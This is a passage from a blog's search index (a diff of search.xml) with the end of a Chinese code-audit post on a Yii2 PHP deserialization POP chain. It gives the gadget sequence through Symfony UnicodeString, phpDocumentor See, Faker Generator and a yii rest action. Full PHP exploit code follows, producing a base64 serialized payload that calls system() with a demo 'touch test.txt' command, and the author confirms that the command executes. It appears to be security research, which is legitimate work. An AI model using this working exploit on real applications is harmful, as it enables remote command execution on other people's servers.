+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Symfony\Component\String\UnicodeString::__wakeup()</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+<p>EXP：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;touch test.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $string;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;string = <span class="keyword">new</span> See;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">UnicodeString</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> UnicodeString()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有个问题是这个POP利用链回显的时候会报错，不能正常显示。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214536.png" alt=""></p>
+<p>但是命令是成功执行的：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214737.png" style="zoom:50%;" />
+<p>讲道理，应该还可以接着挖。</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg">https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg</a></p>
+<p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p>
+<p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
       </tags>
   </entry>
 </search>
